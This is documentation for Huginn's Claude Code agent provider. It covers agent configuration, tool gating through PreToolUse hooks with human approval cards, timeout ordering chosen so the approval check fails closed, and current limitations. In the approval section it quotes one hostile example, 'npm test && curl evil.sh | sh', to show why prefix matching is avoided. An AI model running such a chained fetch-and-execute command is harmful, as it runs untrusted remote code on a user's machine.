# Claude Code Agents

## What it is

A Claude Code agent is a Huginn agent whose `provider` is `claude-code`. Instead of calling an LLM API, every turn drives a real `claude` CLI process bound to one Claude Code session. You chat with it in Huginn like any other agent, but the work — reading files, editing code, running commands — is done by Claude Code itself, on your machine, in a fixed working directory.

This is different from the [Claude Code Bridge](claude-code-bridge.md), which is a read-only observer: it mirrors terminal sessions into Huginn's session list and offers a `claude_code` tool for one-shot delegated tasks. A Claude Code agent is the opposite direction — Claude Code becomes the execution backend for a first-class, ongoing Huginn agent, shaped by that agent's Huginn configuration: system prompt, skills, notepad, and tool approval.

One agent is bound to exactly one Claude Code session for its lifetime, and that session has a fixed working directory set when the agent is created. There is no per-conversation session switching — if you want the agent to work somewhere else, you create a new agent.

**Huginn's toolbelt connections do not reach a Claude Code agent.** GitHub, Slack, Jira and the rest of the toolbelt are Huginn-native integrations that run inside Huginn's own process. Claude Code runs as a separate process and has no way to call them. Bridging the toolbelt into a Claude Code session needs a dedicated MCP server that is a separate, not-yet-built subsystem — a Claude Code agent's `toolbelt` field is recorded on the agent but has no effect today. What a Claude Code agent is expected to get, with no extra configuration, is whatever MCP servers are already registered with the `claude` CLI on this machine — including MuninnDB, if you have it configured there. **This is an inference, not a verified behaviour, and it deserves the same hedge as the `--allowedTools` argv form below:** Huginn passes no `--mcp-config` in v1, so the CLI is expected to fall back to its own configured MCP servers, but that fallback has never been confirmed against the real CLI. If MuninnDB (or any other MCP server) doesn't show up in a Claude Code agent's session, this assumption is the first thing to check.

---

## How to use it

### Create a Claude Code agent

There is no dedicated UI wizard for this provider yet. Create the agent the same way you'd hand-author any custom agent — drop a file in `~/.huginn/agents/` (see [Custom Agents](custom-agents.md)) — with `provider` set to `claude-code`:

```yaml
name: "Codey"
model: "claude-sonnet-4-6"
provider: "claude-code"
claude_session_id: "b1f3c9d2-6e4a-4a11-9e0a-2f7d4c1a9b3e"
claude_cwd: "/Users/you/projects/huginn"
claude_allowed_tools:
  - "Read"
  - "Glob"
  - "Grep"
  - "Bash"
  - "Write"
  - "Edit"
claude_gated_tools:
  - "Bash"
  - "Write"
  - "Edit"
system_prompt: "You are Codey, a Claude Code session scoped to the Huginn repo."
```

Note that `Bash`, `Write` and `Edit` appear in **both** lists. That is not a
mistake and it is not redundant — it is the pattern you want for anything that
actually needs to run unattended. `claude_allowed_tools` is what the agent is
*permitted* to do without asking anyone; `claude_gated_tools` is what takes a
round-trip through Huginn and gets logged. A tool listed only under
`claude_gated_tools` now raises an approval card in this agent's conversation
and waits for a human (see "How approval works" below) instead of running
silently, so this agent can read, search, run commands, write and edit — and
every command, write and edit is recorded, while `Read`/`Glob`/`Grep` run
without the round-trip.

If you want a strictly read-only agent, drop `Bash`, `Write` and `Edit` from
*both* lists rather than gating them: leaving them gated-but-not-allowed now
means every call to them stalls the agent for up to 285 seconds waiting for a
click that will never come, rather than failing fast.

Tool names are case-sensitive and matched exactly. `bash` (Huginn's own
spelling) or `" Bash"` with a stray space matches nothing and silently grants
nothing; Huginn logs a warning at startup for names it does not recognise.

- `claude_session_id` — generate a fresh UUID yourself (e.g. `uuidgen`). This is the Claude Code session the agent will own for its whole life; the first turn creates it, every later turn resumes it.
- `claude_cwd` — the working directory Claude Code runs in. Fixed at creation; there's no way to change it without creating a new agent.

The file is picked up the same way any other agent file is — no restart required.

### Tool names are a different namespace than Huginn's own tools

`claude_allowed_tools` and `claude_gated_tools` take **Claude Code's own CLI tool names** — `Read`, `Write`, `Edit`, `Bash`, `Glob`, `Grep`, `WebFetch`, `Task`, `NotebookEdit`, and so on. This is a completely different namespace from Huginn's `local_tools` field, which names Huginn's own builtins (`read_file`, `write_file`, `bash`, `git_status`, `web_search`). The two are never interchangeable, and this is deliberate: `local_tools: ["*"]` means "all Huginn tools" for a Huginn-native agent, and if that same wildcard were fed into Claude Code's tool grant, it would hand an unattended agent every Claude Code tool, including `Bash`, with no review. `claude_allowed_tools` and `claude_gated_tools` support **no wildcard** — every entry has to be an exact tool name, precisely so a config can't be one typo away from granting everything.

If you leave `claude_gated_tools` empty, the agent does **not** run ungated. An empty list would mean no `PreToolUse` hooks are registered at all, which would leave an unattended agent with no approval boundary — so Huginn falls back to a restrictive built-in default instead of "gate nothing": `Bash`, `Write`, `Edit`, `NotebookEdit`, `WebFetch`, `Task`. Set `claude_gated_tools` explicitly if you want a different set gated.

### How approval works

Every turn, Huginn assembles the `claude` CLI invocation with two tool lists:

- **Pre-authorised tools** (`claude_allowed_tools`) are passed via `--allowedTools`. Claude Code never asks about them — unless they are also gated, in which case the hook still fires (a `PreToolUse` hook runs before any permission check) and the answer is `allow`. That overlap is exactly how you get an audit trail without blocking the agent.
- **Gated tools** (`claude_gated_tools`, or the restrictive default above if you left it empty) each get their own `PreToolUse` hook entry, registered inline via `--settings`. When Claude Code is about to run one of these, it invokes `huginn claude-approve`, which POSTs the tool call to `POST /api/v1/claude/approve` on your local Huginn server. That endpoint correlates the session ID back to the agent it belongs to and checks the tool name against `claude_allowed_tools`: a hit returns `allow` immediately with no card; a miss raises an approval card and blocks on a human (see below) before returning `allow` or `deny`.

Scoping matters here: a tool in **neither** list never calls Huginn at all, so if Huginn is down, only the gated tools are affected — the agent degrades to its ungated capability rather than stopping dead.

So the two lists' actual semantics are: `claude_allowed_tools` is what the agent is permitted to do without asking anyone; `claude_gated_tools` is what triggers a hook round-trip and gets logged — and, if the tool isn't also pre-authorised, blocks on a human. Putting a tool in **both** lists is still the supported pattern for "let this run unattended, but I want an audit trail": the hook fires on every call and logs it, but the outcome is always `allow` immediately, with no card, because the tool is in `claude_allowed_tools`.

**There is now a human in the loop for anything gated-but-not-allowed.** A tool call that is in `claude_gated_tools` but not `claude_allowed_tools` raises an approval card in that agent's conversation in the web UI (and a pending-count badge in the nav), and the tool call **blocks** — Claude Code does not proceed — until someone answers it or 285 seconds pass. No answer within that window is a deny, and the agent continues with the tool refused. Each pending request is its own card; a Huginn server restart clears every outstanding one outright rather than resolving it, since the underlying wait can't outlive the process (see "What happens across restarts" below).

The card itself only appears inside that agent's chat view — if you're not looking at that session or space, there's no card to see. A rising pending count also fires a desktop notification, which, together with the nav badge, is what actually reaches you before the 285-second deadline if you're elsewhere in the app or away from the tab.

**That wait holds the whole agent, not just the one call.** A `claude-code` agent's turn occupies its session for as long as a gated tool call is pending — up to the full 285 seconds — so that one agent is frozen mid-turn while a card is unanswered. Other agents, including other `claude-code` agents, are unaffected; only the agent whose tool call is pending stalls.

**A human clicking Allow can now grant a tool that was never in `--allowedTools`.** Verified against the real CLI on 2026-08-27: with `--allowedTools` containing only `Read`, a hook returning `permissionDecision: "allow"` let a gated `Bash` command run, and `permission_denials` in the result came back empty. Before this work, `--allowedTools` and the hook always produced the same effective permission set — the hook could only confirm what the argv flag already allowed. That's no longer true: the hook is now a source of *additional* permission, not only of deny reasons and an audit trail.

Two ways to answer a card carry memory, and both are one-way in this release:

- **"Always allow this command (until Huginn restarts)"** — remembers the tool call by an exact, byte-for-byte match of the command string (only trailing whitespace is trimmed; no case-folding, no whitespace collapsing, no path canonicalisation). It applies to `Bash` only — `Write` and `Edit` carry different content on every call, so there's no stable string to key on, and the card doesn't offer this option for them. There is deliberately no prefix or pattern matching: treating `npm test` as a prefix would also authorise `npm test && curl evil.sh | sh`. The button's own label says what the memory actually is: it lasts **until the Huginn process restarts** — not the chat session, not the underlying Claude Code session — and is gone the moment `huginn serve` restarts.
- **"Always allow this tool"** — writes the tool permanently into that agent's `claude_allowed_tools` and saves the agent config. From that point on the tool is never gated for that agent again: no card, no hook round-trip that could deny it, nothing. **This is the sharpest edge in the feature.** It is permanent and irreversible from the UI, and reaching it takes a two-click confirm rather than the single click that grants one call: the first click reveals a confirm button, the second commits. In this release the *only* way to undo the grant is to hand-edit the agent's config file and remove the tool from the list — there is no undo button, no config-UI toggle, and no expiry. The two-click gate makes it harder to trigger by accident; it does not make it any less permanent.

**Approval fails closed — and that rests on the hook process always printing a decision.** Claude Code's exit-code contract is narrow: exit `0` with a JSON decision on stdout blocks (or allows) as instructed, exit `2` blocks, and *every other exit code is a non-blocking error that lets the tool run*. A hook that crashes, can't find its binary, or dies on a corrupt config does not block anything. So `huginn claude-approve` is dispatched before Huginn loads config or parses flags, recovers from panics, and exits `2` if it somehow cannot print at all.

If `huginn claude-approve` can't reach the Huginn server, gets a non-200 response, or can't parse the response, it prints an explicit `deny` and names the tool: *"Huginn unreachable — Bash requires approval."* Claude Code surfaces that reason to you verbatim and does not run the tool. There is no approval cache beyond the two memories above — every other gated call is a fresh round-trip, because caching a security decision turns a boundary into a race.

**A hook that times out is not the same as a hook that denies — and this is the part that makes the whole guarantee load-bearing.** Verified empirically against the real CLI: when Claude Code's own hook timeout fires, it kills the `huginn claude-approve` process and **runs the tool anyway** — the write went through, and `permission_denials` in the result came back empty. A `PreToolUse` hook fails *open* on timeout, not closed. That single fact is why the three timeout budgets in this feature are ordered the way they are, tightest first:

- **285s** — the approval store's own deadline. If nobody answers the card by then, the store itself returns `deny` and the wait ends.
- **290s** — `huginn claude-approve`'s HTTP client timeout. If the store somehow never answers, the hook process gives up and prints `deny` itself before anyone else can.
- **300s** — Claude Code's own hook timeout (`ClaudeHookTimeoutSecs`). This is the one Huginn cannot control: if the hook process is still running when this fires, Claude Code kills it and **runs the tool anyway**, fail-open.

Each number leaves headroom before the next one fires, so Huginn always has an answer in hand — a real allow, a real deny, or the deadline's deny — before Claude Code's own timeout could take the decision out of Huginn's hands. These three numbers can never be tuned independently — there is a compile-time guard in the code (next to `claudeApproveTimeout` in `cmd_claude_approve.go`) that fails the build if the margin between the hook timeout and the client timeout collapses. It is not decorative; it is the thing standing between "Huginn is unreachable" and "the tool ran without approval."

### What happens across restarts

A pending approval lives only in memory, and that is deliberate rather than a limitation. The `claude` process backing a gated tool call is a child process of Huginn: if Huginn restarts, that child dies too, and the turn it was in the middle of no longer exists. A pending card describing that call would be describing something nobody can act on any more — persisting it would only resurrect a request with nothing left to answer. So a Huginn restart clears every pending approval outright; there is no recovery or replay on startup, and the web UI simply shows none until new ones arrive.

### Take over a session in a terminal

Because a Claude Code agent's session is a real, ordinary Claude Code session on disk, you can pick it up directly with the CLI:

```
claude --resume b1f3c9d2-6e4a-4a11-9e0a-2f7d4c1a9b3e
```

This is a manual escape hatch, not a Huginn-managed handoff — there is currently no "pause" state that stops Huginn from also sending to the same session while you're in the terminal, so avoid chatting with the agent in Huginn and working in the terminal at the same time. A session should have exactly one writer at once; a guarded takeover flow with an explicit paused state is planned but not built yet.

### What Huginn does and doesn't keep from each turn

Only the newest message you send is passed to `claude` each turn — Claude Code owns the rest of the conversation via `--resume`, so Huginn does not replay history into the prompt. Your system prompt, assigned skills, and notepad *are* reassembled and passed via `--append-system-prompt` on every turn, so an edit to any of them takes effect on your very next message without needing a new session.

The tool calls Claude Code makes during a turn are recorded into Huginn's session history exactly like a native agent's tool calls — same message shapes, same rendering — but Huginn never re-runs them. Claude Code already executed those tools by the time the process exits; Huginn's job is only to persist the record.

**Per-turn cost and token counts are not shown.** The CLI reports `CostUSD`, `NumTurns`, and `DurationMS` for each turn, but nothing in Huginn's chat history currently surfaces them — they're written to Huginn's debug log only. If you're tracking spend on a Claude Code agent, check `huginn serve`'s debug logs rather than the chat UI.

---

## Limitations

**"Always allow this tool" has no undo in the UI.** Promoting a tool into an agent's `claude_allowed_tools` from an approval card is permanent, and reversing it means hand-editing that agent's config file. The card requires two clicks — a confirm step — before the promotion commits, which guards against triggering it by accident, but there is no confirmation-then-revert flow after the fact and no way to see, from the web UI, which tools got promoted this way versus configured up front. See "How approval works" above.

**A pending approval does not survive a Huginn restart.** This is correct, not a gap — the `claude` process behind the call is a child of Huginn and dies with it — but it does mean a card you were about to click can simply vanish out from under you if the server restarts first, with no history of it having existed.

**Per-turn cost and token counts are dropped, and this is a Huginn gap, not a CLI one.** The `claude` CLI itself reports `CostUSD`, `NumTurns`, and `DurationMS` for every turn. Huginn's shared `backend.ChatResponse` type has no field to carry any of the three, so the numbers reach a debug log and nowhere else — not the chat UI, not history, not any spend report. The data exists at the source; the wall is on Huginn's side, and it's the first thing to widen if per-agent spend tracking is ever needed.

**No toolbelt access.** As noted above, GitHub/Slack/Jira/etc. connections configured on the agent's `toolbelt` field are inert for a `claude-code` provider agent until the MCP-server bridge subsystem exists.

**Server mode only.** A Claude Code agent's tool calls are approved over the Huginn server's loopback endpoint, so the agent only works when `huginn serve` is running — in the web UI, in delegated sub-threads, and via `@mention`. The interactive TUI, `--print`, headless mode and `huginn --agent <name>` all run without a server, and each refuses a `claude-code` agent by name rather than answering from an unrelated backend.

**Transcript location follows `CLAUDE_CONFIG_DIR`.** If you set that variable, Claude Code stores transcripts under `$CLAUDE_CONFIG_DIR/projects/` and Huginn looks there. `CLAUDE_CODE_PROJECT_DIR_NAME`, if set, overrides the per-project directory name and is honoured too.

**No agent-creation UI yet.** Creating a Claude Code agent means hand-writing its YAML/JSON file, including generating the session UUID yourself. There's no wizard that provisions the session for you.

**`--allowedTools` argv form is unverified.** Huginn passes pre-authorised tool names as separate space-separated arguments to `--allowedTools` — this has never been confirmed against the real CLI, and no existing caller exercises it. If pre-authorised tools appear to be getting gated (or vice versa) when they shouldn't, this is the first thing to check.

**No live session picker or adoption flow.** You bind an agent to a session ID you generate yourself; there's no UI for adopting an existing Claude Code session someone started by hand in a terminal.

---

## See also

- [Custom Agents](custom-agents.md) — the general agent file format this provider builds on
- [Claude Code Bridge](claude-code-bridge.md) — the read-only observer and one-shot `claude_code` delegation tool
- [Permissions](permissions.md) — Huginn's own three-tier approval gate, which is distinct from the `PreToolUse` hook gate described here
